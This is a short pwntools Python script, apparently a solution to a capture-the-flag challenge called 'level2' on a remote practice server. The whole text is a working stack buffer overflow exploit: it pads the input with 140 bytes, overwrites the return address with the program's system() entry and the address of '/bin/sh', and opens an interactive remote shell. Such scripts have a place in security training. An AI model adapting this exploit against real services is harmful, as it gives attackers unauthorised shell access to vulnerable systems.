from pwn import *
context(log_level='DEBUG')
elf = ELF("./level2")
#io = process("./level2")
#node3.buuoj.cn:28929
io = remote('node3.buuoj.cn',28929)
sys_plt = elf.plt['system']
#bin_sh = 0x0804A024
bin_sh = next(elf.search('/bin/sh'))
payload = 'a'*140 +p32(sys_plt)+p32(0xdeadbeef)+p32(bin_sh)
io.recv()
io.sendline(payload)
io.interactive()